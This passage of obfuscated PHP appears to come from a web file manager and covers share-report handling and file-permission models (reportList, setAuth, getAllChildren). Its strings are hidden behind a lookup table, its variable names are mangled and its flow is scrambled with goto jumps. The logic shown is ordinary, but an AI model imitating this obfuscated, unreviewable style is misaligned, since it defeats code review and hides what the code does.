$this->_listDataApply($A‹…ÀÑ»ƒì[$DÈÇ×½ĞÚ¯[367]]); goto C‚‚®ñ¬âê; C‚‚®ñ¬âê: return $A‹…ÀÑ»ƒì; goto cãÒ¨ëİËá; e‹ÜÚ‰ôåß: if ($DÖØôœ é[$DÈÇ×½ĞÚ¯[756]]) { $DÉ´ÛÑÅšç = $DÖØôœ é[$DÈÇ×½ĞÚ¯[490]] ? $DÖØôœ é[$DÈÇ×½ĞÚ¯[490]] : strtotime(date($DÈÇ×½ĞÚ¯[1894])); $bòã´“Ê´[$DÈÇ×½ĞÚ¯[194]] = array($DÈÇ×½ĞÚ¯[331], array($DÖØôœ é[$DÈÇ×½ĞÚ¯[756]], $DÉ´ÛÑÅšç)); } if ($DÖØôœ é[$DÈÇ×½ĞÚ¯[29]]) { $bòã´“Ê´[$DÖØôœ é[$DÈÇ×½ĞÚ¯[29]]] = 1; } else { $bòã´“Ê´[] = array($DÈÇ×½ĞÚ¯[487] => array($DÈÇ×½ĞÚ¯[1004], 0), $DÈÇ×½ĞÚ¯[489] => array($DÈÇ×½ĞÚ¯[1004], 0), $DÈÇ×½ĞÚ¯[1871] => $DÈÇ×½ĞÚ¯[1825]); } if ($DÖØôœ é[$DÈÇ×½ĞÚ¯[1821]]) { $bòã´“Ê´[] = array($DÈÇ×½ĞÚ¯[484] => $DÖØôœ é[$DÈÇ×½ĞÚ¯[1821]], $DÈÇ×½ĞÚ¯[1464] => array($DÈÇ×½ĞÚ¯[381], "\45{$DÖØôœ é[$DÈÇ×½ĞÚ¯[1821]]}\x25"), $DÈÇ×½ĞÚ¯[1871] => $DÈÇ×½ĞÚ¯[1825]); } goto Dåå‹æëŒ; cãÒ¨ëİËá: } public function listDataApply($DÎ´«õù¿“) { $this->_listDataApply($DÎ´«õù¿“); return $DÎ´«õù¿“; } private function _listDataApply(&$E½İ¥è°¥Ä) { goto bÈ—È«¢é˜; bÈ—È«¢é˜: $fœÑäÏÊĞ» =& $_SERVER[›é¼±]; $Eİ”¸Éèƒ­ = array_to_keyvalue($E½İ¥è°¥Ä, $fœÑäÏÊĞ»[33], $fœÑäÏÊĞ»[1564]); $bõ²ÌóÉË“ = Model($fœÑäÏÊĞ»[532])->userListInfo(array_unique($Eİ”¸Éèƒ­)); goto B‹Êé‘Ÿ¢Æ; B‹Êé‘Ÿ¢Æ: $A‹ÎË¿¡ãË = array_to_keyvalue($E½İ¥è°¥Ä, $fœÑäÏÊĞ»[33], $fœÑäÏÊĞ»[397]); $f‘¼²”í = Model($fœÑäÏÊĞ»[827])->sourceListInfo($A‹ÎË¿¡ãË, !0); foreach ($E½İ¥è°¥Ä as $fºÛó×£ì• => &$E›ô¡³ÆÖ×) { $e…Íï²ÓÂ = $E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[1564]]; $E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[1895]] = $bõ²ÌóÉË“[$e…Íï²ÓÂ] ? $bõ²ÌóÉË“[$e…Íï²ÓÂ] : !1; $e—ÓİßØÔ = $E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[397]]; $E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[85]] = $f‘¼²”í[$e—ÓİßØÔ] ? $f‘¼²”í[$e—ÓİßØÔ] : !1; if ($E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[85]][$fœÑäÏÊĞ»[425]] == $fœÑäÏÊĞ»[87]) { unset($E½İ¥è°¥Ä[$fºÛó×£ì•]); } if ($E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[85]] != $fœÑäÏÊĞ»[191] && !$E›ô¡³ÆÖ×[$fœÑäÏÊĞ»[85]]) { unset($E½İ¥è°¥Ä[$fºÛó×£ì•]); } } goto c¸Œ·¡Ï®â; c¸Œ·¡Ï®â: unset($E›ô¡³ÆÖ×); $E½İ¥è°¥Ä = array_values($E½İ¥è°¥Ä); goto d´˜†ÒÇŒ—; d´˜†ÒÇŒ—: } private function _makeOrder($A‹ËÚå™Í– = '') { goto cæë†Ô®ùõ; cæë†Ô®ùõ: $eÆŒ’…³ëÓ =& $_SERVER[›é¼±]; $Bí—ˆ°‰íè = array($eÆŒ’…³ëÓ[194], $eÆŒ’…³ëÓ[490], $eÆŒ’…³ëÓ[1884], $eÆŒ’…³ëÓ[1885]); $a«ÈÙëâË¬ = array($eÆŒ’…³ëÓ[442] => $eÆŒ’…³ëÓ[443], $eÆŒ’…³ëÓ[444] => $eÆŒ’…³ëÓ[445]); goto C”Š‘‚‘œ‡; C”Š‘‚‘œ‡: $f±ˆİŠÖ§ = Input::get($eÆŒ’…³ëÓ[449], $eÆŒ’…³ëÓ[7], $eÆŒ’…³ëÓ[418], $Bí—ˆ°‰íè); $E’ÒåÑ”ù¤ = Input::get($eÆŒ’…³ëÓ[450], $eÆŒ’…³ëÓ[7], $eÆŒ’…³ëÓ[1896], array($eÆŒ’…³ëÓ[1820], $eÆŒ’…³ëÓ[444])); $E’ÒåÑ”ù¤ = $a«ÈÙëâË¬[$E’ÒåÑ”ù¤]; goto FÄÆÅí‘¢ò; FÄÆÅí‘¢ò: $A‹ËÚå™Í– = $A‹ËÚå™Í– . "{$f±ˆİŠÖ§}\40{$E’ÒåÑ”ù¤}"; return $this->order($A‹ËÚå™Í–); goto bÎ÷ˆ—Œ˜; bÎ÷ˆ—Œ˜: } public function reportAdd($BäÍ“±Š½¡) { $b³®è…í…‡ =& $_SERVER[›é¼±]; $fô¿Ö’æ = array($b³®è…í…‡[482] => $BäÍ“±Š½¡[$b³®è…í…‡[482]], $b³®è…í…‡[1564] => USER_ID); if (Model($b³®è…í…‡[1892])->where($fô¿Ö’æ)->find()) { return !1; } $DÇÔéë¬Ö‡ = array($b³®è…í…‡[482] => $BäÍ“±Š½¡[$b³®è…í…‡[482]], $b³®è…í…‡[1464] => $BäÍ“±Š½¡[$b³®è…í…‡[1464]], $b³®è…í…‡[397] => $BäÍ“±Š½¡[$b³®è…í…‡[397]], $b³®è…í…‡[461] => $BäÍ“±Š½¡[$b³®è…í…‡[461]], $b³®è…í…‡[1564] => USER_ID, $b³®è…í…‡[29] => $BäÍ“±Š½¡[$b³®è…í…‡[29]], $b³®è…í…‡[445] => $BäÍ“±Š½¡[$b³®è…í…‡[445]]); return Model($b³®è…í…‡[1892])->add($DÇÔéë¬Ö‡); } public function reportList($AŠˆíº— ) { goto Cˆî­¤çòõ; fƒñÇ¥‘˜Ë: if (empty($EÌ‡¾ØÇ…µ[$DÜïÏÛÓÊ[367]])) { return array(); } $dÇÓ¦¨æ„ = array_to_keyvalue_group($EÌ‡¾ØÇ…µ[$DÜïÏÛÓÊ[367]], $DÜïÏÛÓÊ[745], $DÜïÏÛÓÊ[482]); if (!empty($dÇÓ¦¨æ„[0])) { $AŠˆíº—  = $dÇÓ¦¨æ„[0]; $DÏè¯ÊºÁÃ = array($DÜïÏÛÓÊ[482] => array($DÜïÏÛÓÊ[7], $AŠˆíº— )); $aİğŞëĞİÇ = $this->where($DÏè¯ÊºÁÃ)->field($DÜïÏÛÓÊ[482])->select(); $aİğŞëĞİÇ = array_to_keyvalue($aİğŞëĞİÇ, $DÜïÏÛÓÊ[33], $DÜïÏÛÓÊ[482]); $C£æ†ñŠï° = array_diff($AŠˆíº— , $aİğŞëĞİÇ); if (!empty($C£æ†ñŠï°)) { foreach ($EÌ‡¾ØÇ…µ[$DÜïÏÛÓÊ[367]] as $AÌÕÁª¤Ù‰ => $CŠ™ßìçâö) { if (in_array($CŠ™ßìçâö[$DÜïÏÛÓÊ[482]], $C£æ†ñŠï°)) { unset($EÌ‡¾ØÇ…µ[$DÜïÏÛÓÊ[367]][$AÌÕÁª¤Ù‰]); } } } } goto Cù­›¹†Ÿ; Cˆî­¤çòõ: $DÜïÏÛÓÊ =& $_SERVER[›é¼±]; $DÏè¯ÊºÁÃ = array(); if ($AŠˆíº— [$DÜïÏÛÓÊ[756]]) { $bŒ‚µˆÖÈò = $AŠˆíº— [$DÜïÏÛÓÊ[490]] ? $AŠˆíº— [$DÜïÏÛÓÊ[490]] : strtotime(date($DÜïÏÛÓÊ[1894])); $DÏè¯ÊºÁÃ[$DÜïÏÛÓÊ[194]] = array($DÜïÏÛÓÊ[331], array($AŠˆíº— [$DÜïÏÛÓÊ[756]], $bŒ‚µˆÖÈò)); } goto c¸â©ĞïŞ‘; c¸â©ĞïŞ‘: if (isset($AŠˆíº— [$DÜïÏÛÓÊ[29]]) && in_array($AŠˆíº— [$DÜïÏÛÓÊ[29]], array($DÜïÏÛÓÊ[87], $DÜïÏÛÓÊ[429], $DÜïÏÛÓÊ[1897], $DÜïÏÛÓÊ[1898], $DÜïÏÛÓÊ[1899]))) { $DÏè¯ÊºÁÃ[$DÜïÏÛÓÊ[29]] = $AŠˆíº— [$DÜïÏÛÓÊ[29]]; } if (isset($AŠˆíº— [$DÜïÏÛÓÊ[745]]) && in_array($AŠˆíº— [$DÜïÏÛÓÊ[745]], array($DÜïÏÛÓÊ[191], $DÜïÏÛÓÊ[87], $DÜïÏÛÓÊ[429], $DÜïÏÛÓÊ[1897]))) { $DÏè¯ÊºÁÃ[$DÜïÏÛÓÊ[745]] = $AŠˆíº— [$DÜïÏÛÓÊ[745]]; } $F¾ÁŠ˜”ä£ = Input::get($DÜïÏÛÓÊ[450], $DÜïÏÛÓÊ[7], $DÜïÏÛÓÊ[1896], array($DÜïÏÛÓÊ[1820], $DÜïÏÛÓÊ[444])); goto B˜ƒÙ¾ÓŒ´; Cù­›¹†Ÿ: $this->_listDataApply($EÌ‡¾ØÇ…µ[$DÜïÏÛÓÊ[367]]); return $EÌ‡¾ØÇ…µ; goto e¢Ÿ¥–áœ; B˜ƒÙ¾ÓŒ´: $FŸ¬±øŒ¨ñ = array($DÜïÏÛÓÊ[442] => $DÜïÏÛÓÊ[443], $DÜïÏÛÓÊ[444] => $DÜïÏÛÓÊ[445]); $bŞ²‘å‘ = $DÜïÏÛÓÊ[1900] . $FŸ¬±øŒ¨ñ[$F¾ÁŠ˜”ä£]; $EÌ‡¾ØÇ…µ = Model($DÜïÏÛÓÊ[1892])->where($DÏè¯ÊºÁÃ)->order($bŞ²‘å‘)->selectPage(20); goto fƒñÇ¥‘˜Ë; e¢Ÿ¥–áœ: } public function reportStatus($fÇèêÈ’ÈĞ) { goto BÙ¨“¦•È‘; FñŸ›™ášÓ: if (!$CéÛ®–‰ùŠ) { return !1; } $a×˜Š¾óÎ¥ = array($Eñ´—›•ïè[745] => $fÇèêÈ’ÈĞ[$Eñ´—›•ïè[745]]); if ($fÇèêÈ’ÈĞ[$Eñ´—›•ïè[745]] == $Eñ´—›•ïè[1897] && $CéÛ®–‰ùŠ[$Eñ´—›•ïè[745]] == $Eñ´—›•ïè[1897]) { $a×˜Š¾óÎ¥[$Eñ´—›•ïè[745]] = 0; } goto d¯Ã¥È–º‘; dµ„´à½Ø‰: return $eµ‚­¼‡†Æ; goto a‚ŒªÕ”; d¯Ã¥È–º‘: $eµ‚­¼‡†Æ = Model($Eñ´—›•ïè[1892])->where($Eö›ÒêÏôà)->save($a×˜Š¾óÎ¥); if ($fÇèêÈ’ÈĞ[$Eñ´—›•ïè[745]] == $Eñ´—›•ïè[429]) { if ($CéÛ®–‰ùŠ[$Eñ´—›•ïè[461]] != $Eñ´—›•ïè[191] && $this->shareFileMeta($CéÛ®–‰ùŠ[$Eñ´—›•ïè[461]])) { $this->shareFileMeta($CéÛ®–‰ùŠ[$Eñ´—›•ïè[461]], 0); } $this->remove($CéÛ®–‰ùŠ[$Eñ´—›•ïè[482]]); return !0; } if ($eµ‚­¼‡†Æ && $fÇèêÈ’ÈĞ[$Eñ´—›•ïè[745]] == $Eñ´—›•ïè[1897]) { $d®‡Š˜Ÿš = $a×˜Š¾óÎ¥[$Eñ´—›•ïè[745]] == $Eñ´—›•ïè[1897] ? 1 : 0; $this->shareFileMeta($CéÛ®–‰ùŠ[$Eñ´—›•ïè[461]], $d®‡Š˜Ÿš); $this->removeByFile($CéÛ®–‰ùŠ[$Eñ´—›•ïè[461]]); } goto dµ„´à½Ø‰; BÙ¨“¦•È‘: $Eñ´—›•ïè =& $_SERVER[›é¼±]; $Eö›ÒêÏôà = array($Eñ´—›•ïè[395] => $fÇèêÈ’ÈĞ[$Eñ´—›•ïè[395]]); $CéÛ®–‰ùŠ = Model($Eñ´—›•ïè[1892])->where($Eö›ÒêÏôà)->field($Eñ´—›•ïè[1901])->find(); goto FñŸ›™ášÓ; a‚ŒªÕ”: } private function removeByFile($cÉŠ™·šè) { goto F‘ÃÏÜ“È; dÃÜ‹„ĞµÆ: $bÊë†ÉÛæË = array_to_keyvalue($DÑÆ²¤¥†Í, $b§ë”½œÅŠ[33], $b§ë”½œÅŠ[482]); $this->remove($bÊë†ÉÛæË); goto Fé×ˆ»ß‚ä; F„‡ÍñÇ’•: $eíÏÎäÁ¦ = array($b§ë”½œÅŠ[397] => array($b§ë”½œÅŠ[7], $cµøÑ‰æº), $b§ë”½œÅŠ[487] => 1); $DÑÆ²¤¥†Í = $this->where($eíÏÎäÁ¦)->field($b§ë”½œÅŠ[482])->select(); if (empty($DÑÆ²¤¥†Í)) { return; } goto dÃÜ‹„ĞµÆ; F‘ÃÏÜ“È: $b§ë”½œÅŠ =& $_SERVER[›é¼±]; $DÑÆ²¤¥†Í = Model($b§ë”½œÅŠ[827])->where(array($b§ë”½œÅŠ[461] => $cÉŠ™·šè))->field($b§ë”½œÅŠ[397])->select(); $cµøÑ‰æº = array_to_keyvalue($DÑÆ²¤¥†Í, $b§ë”½œÅŠ[33], $b§ë”½œÅŠ[397]); goto F„‡ÍñÇ’•; Fé×ˆ»ß‚ä: } private function shareFileMeta($c÷œÇª ©, $cÊÛ‰“¶’ = null) { $dÌ…·Ù·ƒ =& $_SERVER[›é¼±]; $B±’ˆÉ²„Ú = array($dÌ…·Ù·ƒ[461] => $c÷œÇª ©, $dÌ…·Ù·ƒ[93] => $dÌ…·Ù·ƒ[1902]); if (is_null($cÊÛ‰“¶’)) { return Model($dÌ…·Ù·ƒ[1903])->where($B±’ˆÉ²„Ú)->find(); } $B±’ˆÉ²„Ú[$dÌ…·Ù·ƒ[372]] = $cÊÛ‰“¶’; Model($dÌ…·Ù·ƒ[1903])->add($B±’ˆÉ²„Ú, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\145\137\x61\165\x74\x68"; public function getAuth($F‰ÉÂ£ƒã„) { goto fÛòÆì‰ë²; d¯ÔƒîÙ¤—: $cÇö˜÷ÜÔ¶ = array(); $e£¶æ¾ô« = 2 << 25; foreach ($B½çé°‡”÷ as $bÌÚ‚ìÀ•) { goto FÅˆ­´ƒ¿•; bó±•âŞæ‡: if ($bÌÚ‚ìÀ•[$bÈºâä©²­[406]] == SourceModel::TYPE_USER && $bÌÚ‚ìÀ•[$bÈºâä©²­[498]] == $bÈºâä©²­[191]) { $F«÷½ºèÀ = 0; } $cÇö˜÷ÜÔ¶[] = $Bíµ©ËÉã›[$bÈºâä©²­[408]] + $F«÷½ºèÀ; goto F‹ÚãÁˆ; C¢¨ÒÖİºø: $F«÷½ºèÀ = 0; if ($bÌÚ‚ìÀ•[$bÈºâä©²­[406]] == SourceModel::TYPE_GROUP) { $F«÷½ºèÀ = $e£¶æ¾ô« * 2; } if ($bÌÚ‚ìÀ•[$bÈºâä©²­[406]] == SourceModel::TYPE_USER) { $F«÷½ºèÀ = $e£¶æ¾ô«; } goto bó±•âŞæ‡; FÅˆ­´ƒ¿•: $Bíµ©ËÉã› = Model($bÈºâä©²­[501])->listData($bÌÚ‚ìÀ•[$bÈºâä©²­[1833]]); if (!$Bíµ©ËÉã›) { continue; } $eì¥ŸÖˆŞ[] = $bÌÚ‚ìÀ•; goto C¢¨ÒÖİºø; F‹ÚãÁˆ: } goto dèÉÁÃ»‡; fÛòÆì‰ë²: $bÈºâä©²­ =& $_SERVER[›é¼±]; $B½çé°‡”÷ = $this->sourceAuthSelect($F‰ÉÂ£ƒã„); $eì¥ŸÖˆŞ = array(); goto d¯ÔƒîÙ¤—; dèÉÁÃ»‡: array_multisort($cÇö˜÷ÜÔ¶, SORT_DESC, $eì¥ŸÖˆŞ); return $eì¥ŸÖˆŞ; goto Bòì‘¶·Îù; Bòì‘¶·Îù: } public function sourceAuthSelect($f¦Ó¿õÍ§æ) { goto cáÄ®¥ÙÖ; a×ö¯ßŠŠ¾: if ($d—ù©Ò÷¬½) { $f¦Ó¿õÍ§æ = array($f¦Ó¿õÍ§æ); } $A©§ª¦èß = array(); foreach ($f¦Ó¿õÍ§æ as $FÛöäÎä²•) { if (isset($DÈ®‘ÑÒíî[$FÛöäÎä²•])) { $A©§ª¦èß[$FÛöäÎä²•] = $DÈ®‘ÑÒíî[$FÛöäÎä²•]; } } goto F‡ÍÖí­Ñ‡; cáÄ®¥ÙÖ: $Aµß‘Ù†ˆ‡ =& $_SERVER[›é¼±]; static $DÈ®‘ÑÒíî = array(); $d—ù©Ò÷¬½ = is_array($f¦Ó¿õÍ§æ) ? !1 : !0; goto a×ö¯ßŠŠ¾; e¤‹”ä“¢â: if ($d—ù©Ò÷¬½) { return $fõ¬§Çâµ‡; } return $d£¯¦åè¸; goto B¤¼Î¡¡îÙ; b¹ÁŸ¶óŞÇ: $fõ¬§Çâµ‡ = $this->field($Cƒë‰¢Æ)->order($Aµß‘Ù†ˆ‡[395])->where($D¼°å¹È)->select(); $d£¯¦åè¸ = array_to_keyvalue_group($fõ¬§Çâµ‡, $Aµß‘Ù†ˆ‡[397]); foreach ($f¦Ó¿õÍ§æ as $FÛöäÎä²•) { $DÈ®‘ÑÒíî[$FÛöäÎä²•] = $d£¯¦åè¸[$FÛöäÎä²•] ? $d£¯¦åè¸[$FÛöäÎä²•] : array(); } goto e¤‹”ä“¢â; F‡ÍÖí­Ñ‡: if (count($A©§ª¦èß) == count($f¦Ó¿õÍ§æ)) { return $d—ù©Ò÷¬½ ? $A©§ª¦èß[$f¦Ó¿õÍ§æ[0]] : $A©§ª¦èß; } $Cƒë‰¢Æ = $Aµß‘Ù†ˆ‡[1904]; $D¼°å¹È = array($Aµß‘Ù†ˆ‡[397] => array($Aµß‘Ù†ˆ‡[7], $f¦Ó¿õÍ§æ)); goto b¹ÁŸ¶óŞÇ; B¤¼Î¡¡îÙ: } public function setAuth($CŸ­ŒôÈ…, $DâóóŒäÍ) { goto AÇ°ÙàÊÆÕ; Bµ…‡‚‡: if ($dø‰ˆ¤†‰ß != $E…”ˆÌÕƒ) { $D¹¸¥§Â–ê = array($FÊîÄµê£Ù[1733] => $dø‰ˆ¤†‰ß); $E‘ÛÍ Œã = Model($FÊîÄµê£Ù[1819])->field($FÊîÄµê£Ù[1564])->where($D¹¸¥§Â–ê)->select(); $E‘ÛÍ Œã = array_to_keyvalue($E‘ÛÍ Œã, $FÊîÄµê£Ù[33], $FÊîÄµê£Ù[1564]); } $c¤ˆµ÷İËå = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $A¢ª‡á×‘ê = array(); goto A’«çÛÛÃå; A“â²Ë¨×“: if ($FÖÒ…”ŒŞ¦[$FÊîÄµê£Ù[406]] != SourceModel::TYPE_GROUP) { return !1; } $E…”ˆÌÕƒ = 1; $dø‰ˆ¤†‰ß = $FÖÒ…”ŒŞ¦[$FÊîÄµê£Ù[498]]; goto Bµ…‡‚‡; cÁëÓÂ„à: return !0; goto D‘¦òô§¬; AÇ°ÙàÊÆÕ: $FÊîÄµê£Ù =& $_SERVER[›é¼±]; $FÖÒ…”ŒŞ¦ = Model($FÊîÄµê£Ù[1239])->sourceInfo($CŸ­ŒôÈ…); if (!$FÖÒ…”ŒŞ¦) { return !1; } goto A“â²Ë¨×“; A’«çÛÛÃå: foreach ($DâóóŒäÍ as $dÙÁŒÄÔ³·) { if (!in_array($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[406]], $c¤ˆµ÷İËå)) { show_json(LNG($FÊîÄµê£Ù[1905]), !1); } if ($dø‰ˆ¤†‰ß != $E…”ˆÌÕƒ) { if ($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[406]] == SourceModel::TYPE_GROUP) { } if ($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[498]] != 0 && !in_array($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[498]], $E‘ÛÍ Œã)) { } } if ($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[498]] == 0) { $dÙÁŒÄÔ³·[$FÊîÄµê£Ù[406]] = SourceModel::TYPE_USER; } $A¢ª‡á×‘ê[] = array($FÊîÄµê£Ù[397] => $CŸ­ŒôÈ…, $FÊîÄµê£Ù[406] => intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[406]]), $FÊîÄµê£Ù[498] => intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[498]]), $FÊîÄµê£Ù[1833] => intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[1833]]) ? intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[1833]]) : 0, $FÊîÄµê£Ù[1887] => intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[1887]]) ? intval($dÙÁŒÄÔ³·[$FÊîÄµê£Ù[1887]]) : -1); } $this->where(array($FÊîÄµê£Ù[412] => $CŸ­ŒôÈ…))->delete(); $this->addAll($A¢ª‡á×‘ê); goto cÁëÓÂ„à; D‘¦òô§¬: } public function authClear($BòŞÄ†×ŞÍ) { $añ…È‚îº =& $_SERVER[›é¼±]; $eƒÎÅŸ×ÃÉ = Model($añ…È‚îº[1239])->sourceInfo($BòŞÄ†×ŞÍ); $d”ÅŞñÏ = array($BòŞÄ†×ŞÍ); if ($eƒÎÅŸ×ÃÉ[$añ…È‚îº[405]] == $añ…È‚îº[87]) { $FÇæ¨Õš§ö = array($añ…È‚îº[578] => array($añ…È‚îº[538], $eƒÎÅŸ×ÃÉ[$añ…È‚îº[515]] . $BòŞÄ†×ŞÍ . $añ…È‚îº[539])); $d”ÅŞñÏ = Model($añ…È‚îº[1239])->field($añ…È‚îº[412])->where($FÇæ¨Õš§ö)->getField($añ…È‚îº[397], !0); $d”ÅŞñÏ[] = $BòŞÄ†×ŞÍ; } $this->where(array($añ…È‚îº[412] => array($añ…È‚îº[413], $d”ÅŞñÏ)))->delete(); return !0; } public function getAllChildren($CƒáÆé…‘¥) { goto a‚‰ñƒòÔ¹; FŠ åİŠÒè: if ($a°ŒÄÀÊùƒ[$bÖö¹À·°±[406]] != SourceModel::TYPE_GROUP) { return array(); } $Cø¡¡Ä„Éø = 1; $EÇë”Ö´“ = array($CƒáÆé…‘¥); goto c½ªçß¹Ä; F™Ü·ãàŠª: $A†ÕŞñâƒ = Model($bÖö¹À·°±[827])->field($b³ÃÍÁİ)->where($A©º›ÆÏÛƒ)->select(); $b÷Ò¹…Éƒ = array($CƒáÆé…‘¥); foreach ($A†ÕŞñâƒ as $a°ËËğöŠ) { foreach ($EÇë”Ö´“ as $cçİãˆÉÎ) { $A¹ŒË¯œ“ = $bÖö¹À·°±[47] . $cçİãˆÉÎ . $bÖö¹À·°±[47]; $C×éÛàŞ™ğ = $a°ËËğöŠ[$bÖö¹À·°±[515]] . $a°ËËğöŠ[$bÖö¹À·°±[397]] . $bÖö¹À·°±[47]; if (strstr($C×éÛàŞ™ğ, $A¹ŒË¯œ“)) { $b÷Ò¹…Éƒ[] = $a°ËËğöŠ[$bÖö¹À·°±[397]]; break; } } } goto e‡ğ³Æ•‚; A’ùİˆã¤ê: if (!$D›‰­ˆ„) { return array(); } $b³ÃÍÁİ = $bÖö¹À·°±[1906]; $A©º›ÆÏÛƒ = array($bÖö¹À·°±[397] => array($bÖö¹À·°±[7], $D›‰­ˆ„), $bÖö¹À·°±[425] => $bÖö¹À·°±[191]); goto F™Ü·ãàŠª; e‡ğ³Æ•‚: return $this->sourceListAuth($b÷Ò¹…Éƒ); goto CÂ´ÌÕ‹Ë¶; a‚‰ñƒòÔ¹: $bÖö¹À·°± =& $_SERVER[›é¼±]; $a°ŒÄÀÊùƒ = Model($bÖö¹À·°±[1239])->sourceInfo($CƒáÆé…‘¥); if ($a°ŒÄÀÊùƒ[$bÖö¹À·°±[405]] != $bÖö¹À·°±[87]) { return $this->sourceListAuth(array($CƒáÆé…‘¥)); } goto FŠ åİŠÒè; c½ªçß¹Ä: if ($a°ŒÄÀÊùƒ[$bÖö¹À·°±[492]] == $bÖö¹À·°±[191] && $a°ŒÄÀÊùƒ[$bÖö¹À·°±[498]] != $Cø¡¡Ä„Éø) { $EÇë”Ö´“ = $this->groupChidldAllRootSource($a°ŒÄÀÊùƒ[$bÖö¹À·°±[498]]); } $D›‰­ˆ„ = $this->field($bÖö¹À·°±[397])->group($bÖö¹À·°±[397])->select(); $D›‰­ˆ„ = array_to_keyvalue($D›‰­ˆ„, $bÖö¹À·°±[33], $bÖö¹À·°±[397]); goto A’ùİˆã¤ê; CÂ´ÌÕ‹Ë¶: } private function sourceListAuth($CáÃ°Ä—‹) { goto CíòàÒ‘â–; CíòàÒ‘â–: $Dáí¢ƒ¥ÈÚ =& $_SERVER[›é¼±]; $B†Ø„‰™Œ¯ = Model($Dáí¢ƒ¥ÈÚ[1239])->sourceListInfo($CáÃ°Ä—‹, !0); $bß¬ïàÔÙ = $this->sourceAuthSelect($CáÃ°Ä—‹); goto b°¯ìİ­’‘; b°¯ìİ­’‘: $aÎ­‚Ò¾È = array(); $d‰áÊÚŠ†¸ = array(); foreach ($B†Ø„‰™Œ¯ as $FŸŸáÉ·) { goto Aâ„óôß¢Å; cèÏ†ŒÑ¤Ó: $FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[1907]] = $this->authTargetInfo($cæÒ©òÂÉ); $FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[513]] = rtrim($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[519]], $Dáí¢ƒ¥ÈÚ[8]) . $Dáí¢ƒ¥ÈÚ[8] . ltrim($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[513]], $Dáí¢ƒ¥ÈÚ[8]); $aÎ­‚Ò¾È[] = $FŸŸáÉ·; goto AÇ¼õöôŒ; AÇ¼õöôŒ: $fÜ–İ®ïÕä = count(explode($Dáí¢ƒ¥ÈÚ[8], trim($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[513]], $Dáí¢ƒ¥ÈÚ[8]))); $d‰áÊÚŠ†¸[] = $fÜ–İ®ïÕä + ($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[29]] == $Dáí¢ƒ¥ÈÚ[77] ? 0 : 1000); goto A§Ë¹—ç³; Aâ„óôß¢Å: unset($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[448]]); unset($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[446]]); unset($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[408]]); goto B«¸”İã¶†; B«¸”İã¶†: unset($FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[85]]); $cæÒ©òÂÉ = $bß¬ïàÔÙ[$FŸŸáÉ·[$Dáí¢ƒ¥ÈÚ[397]]]; if (!$cæÒ©òÂÉ) { continue; } goto cèÏ†ŒÑ¤Ó; A§Ë¹—ç³: } goto f”×…Å’ˆå; f”×…Å’ˆå: array_multisort($d‰áÊÚŠ†¸, SORT_ASC, $aÎ­‚Ò¾È); return $aÎ­‚Ò¾È; goto bŸõ½‘ŠĞá; bŸõ½‘ŠĞá: } private function groupChidldAllRootSource($fÎ›¡ëÚ–) { $a“«°é¥¦ =& $_SERVER[›é¼±]; $B‘ìäí± = Model($a“«°é¥¦[1908])->groupChildrenAll($fÎ›¡ëÚ–); $Dìí–¡Õå­ = array($a“«°é¥¦[492] => 0, $a“«°é¥¦[498] => array($a“«°é¥¦[7], $B‘ìäí±), $a“«°é¥¦[406] => SourceModel::TYPE_GROUP); $E½àÃĞ‹‰ = Model($a“«°é¥¦[827])->field($a“«°é¥¦[397])->where($Dìí–¡Õå­)->select(); $E½àÃĞ‹‰ = array_to_keyvalue($E½àÃĞ‹‰, $a“«°é¥¦[33], $a“«°é¥¦[397]); return $E½àÃĞ‹‰; } private function authTargetInfo($CÌäÚ‹“âÉ) { goto Ağ™íÖ¨“Ô; Ağ™íÖ¨“Ô: $bˆƒ‡ÇŞÑÚ =& $_SERVER[›é¼±]; $EèÜ¬®¢à¹ = array(); $dåƒØì± = array(); goto a‰Ò¶óİä; a‰Ò¶óİä: $eó¨©‰Çò‹ = 2 << 25; foreach ($CÌäÚ‹“âÉ as $eÕ‡©èîŠÓ) { goto BØµ¼¿é; FˆîˆŞì‡: $E»Ğ¼¦‚¸Ô = 0; if ($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[406]] == SourceModel::TYPE_GROUP) { $E»Ğ¼¦‚¸Ô = $eó¨©‰Çò‹ * 2; } if ($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[406]] == SourceModel::TYPE_USER) { $E»Ğ¼¦‚¸Ô = $eó¨©‰Çò‹; } goto eàÌßöÉÙÉ; eäŒŠ¿®: if (!$eê»‰îˆ¼Ã) { continue; } $eê»‰îˆ¼Ã[$bˆƒ‡ÇŞÑÚ[460]] = $FœƒÂïØ; $EèÜ¬®¢à¹[] = $eê»‰îˆ¼Ã; goto FˆîˆŞì‡; BØµ¼¿é: $FœƒÂïØ = Model($bˆƒ‡ÇŞÑÚ[501])->listData($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[1833]]); if (!$FœƒÂïØ) { continue; } if ($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[406]] == SourceModel::TYPE_USER) { 